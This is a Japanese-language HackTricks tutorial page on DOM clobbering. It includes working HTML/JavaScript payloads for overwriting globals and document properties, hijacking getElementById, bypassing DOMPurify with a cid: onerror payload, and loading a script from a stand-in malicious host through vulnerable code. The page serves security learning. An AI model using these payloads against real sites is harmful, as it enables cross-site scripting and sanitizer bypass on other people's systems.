# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **基本**

HTMLタグの属性**`id`**と**`name`**を使用して、**JSコンテキスト内にグローバル変数を生成する**ことが可能です。
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**のみ** 特定の要素は **name属性** を使用してグローバルをクラッシャーできます。それらは: `embed`, `form`, `iframe`, `image`, `img` および `object` です。

興味深いことに、**form要素** を使用して変数を **クラッシャー** にすると、要素自体の **`toString`** 値が得られます: `[object HTMLFormElement]` ですが、**anchor** の場合、**`toString`** はアンカーの **`href`** になります。したがって、**`a`** タグを使用してクラッシャーを行うと、**文字列として扱われる** ときに **値** を **制御** できます:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### 配列と属性

配列とオブジェクトの属性を**クラッシャー**することも可能です:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**3番目の属性**（例：x.y.z）を上書きするには、**`form`**を使用する必要があります：
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
属性をさらにクラッキングすることは**より複雑ですが、それでも可能です**。iframeを使用します:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
styleタグは**iframeがレンダリングされるのに十分な時間を与えるため**に使用されます。これがないと、**undefined**のアラートが表示されます。
{% endhint %}

より深い属性をクラッシャーするには、**htmlエンコーディングを使用したiframes**を次のように使用できます：
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **フィルターバイパス**

フィルターが `document.getElementByID('x').attributes` のようなものでノードの **プロパティ** を **ループ** している場合、属性 **`.attributes`** を **クラッシャー** してフィルターを **壊す** ことができます。 **`tagName`** 、 **`nodeName`** 、 **`parentNode`** などの他のDOMプロパティも **クラッシャブル** です。
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject`のクラッバーリング**

JavaScriptでは、次のようなものを見つけることが一般的です：
```javascript
var someObject = window.someObject || {};
```
HTMLをページ上で操作することで、`someObject`をDOMノードで上書きすることができ、潜在的にセキュリティの脆弱性を引き起こす可能性があります。例えば、`someObject`を悪意のあるスクリプトを指すアンカー要素に置き換えることができます：
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
脆弱なコードの例としては：
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
この方法は、スクリプトソースを利用して不要なコードを実行します。

**トリック**: **`DOMPurify`** は **`cid:`** プロトコルを使用することを許可しており、**二重引用符をURLエンコードしません**。これは、**実行時にデコードされるエンコードされた二重引用符を注入できる**ことを意味します。したがって、**`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** のようなものを注入すると、HTMLエンコードされた `&quot;` が **実行時にデコードされ**、属性値から **エスケープ** されて **`onerror`** イベントを **作成** します。

別の技術は **`form`** 要素を使用します。特定のクライアントサイドライブラリは、新しく作成されたフォーム要素の属性を検査してクリーンアップします。しかし、フォーム内に `id=attributes` の `input` を追加することで、属性プロパティを効果的に上書きし、サニタイザーが実際の属性にアクセスできないようにします。

このタイプのクラッキングの例を[**このCTFの解説で見つけることができます**](iframes-in-xss-and-csp.md#iframes-in-sop-2)。

## ドキュメントオブジェクトのクラッキング

ドキュメントによると、DOMクラッキングを使用してドキュメントオブジェクトの属性を上書きすることが可能です：

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) インターフェースは [named properties](https://webidl.spec.whatwg.org/#dfn-support-named-properties) をサポートしています。[Document](https://html.spec.whatwg.org/multipage/dom.html#document) オブジェクトの [supported property names](https://webidl.spec.whatwg.org/#dfn-supported-property-names) は、次のもので構成されます。[tree order](https://dom.spec.whatwg.org/#concept-tree-order) に従い、後の重複を無視し、同じ要素が両方を提供する場合は、[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) 属性からの値が名前属性からの値の前に来ます：
>
> \- 空でない名前コンテンツ属性を持ち、ドキュメントを [root](https://dom.spec.whatwg.org/#concept-tree-root) とする [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) にあるすべての [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)、[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)、[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)、[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)、および [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) 要素の名前コンテンツ属性の値；
> \
> \- 空でない [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) コンテンツ属性を持ち、ドキュメントを [root](https://dom.spec.whatwg.org/#concept-tree-root) とする [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) にあるすべての [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) 要素の [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) コンテンツ属性の値；
> \
> \- 空でない [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) コンテンツ属性と空でない名前コンテンツ属性の両方を持ち、ドキュメントを [root](https://dom.spec.whatwg.org/#concept-tree-root) とする [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) にあるすべての [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) 要素の [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) コンテンツ属性の値。

この技術を使用すると、一般的に使用される **`document.cookie`、`document.body`、`document.children`** などの **値を上書き** したり、`document.querySelector` のような Document インターフェース内のメソッドを上書きしたりできます。
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2) [img, form, cookie: img]

typeof(document.cookie)
'object
```
## 要素がクラッシャーされた後の書き込み

**`document.getElementById()`** と **`document.querySelector()`** への呼び出しの結果は、同じ id 属性を持つ `<html>` または `<body>` タグを注入することで変更できます。これを行う方法は次のとおりです：
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
さらに、これらの注入されたHTML/bodyタグを隠すためにスタイルを使用することで、`innerText`内の他のテキストからの干渉を防ぎ、攻撃の効果を高めることができます：
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVGに関する調査では、`<body>`タグも効果的に利用できることが明らかになりました：
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG内でHTMLタグがChromeやFirefoxなどのブラウザで機能するためには、`<foreignobject>`タグが必要です：
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

**フォーム内に新しいエントリを追加する**ことは、**いくつかのタグ内に`form`属性を指定する**だけで可能です。これを使用して、**フォーム内に新しい値を追加**したり、新しい**ボタン**を追加して**送信する**こともできます（クリックジャッキングや一部の`.click()` JSコードの悪用）：

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* フォーム属性の詳細については[**ボタンを確認してください**](https://www.w3schools.com/tags/tag\_button.asp)**。**

## 参考文献

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. ハッカーのためのJavaScript: ハッカーのように考えることを学ぶ。

{% hint style="success" %}
AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
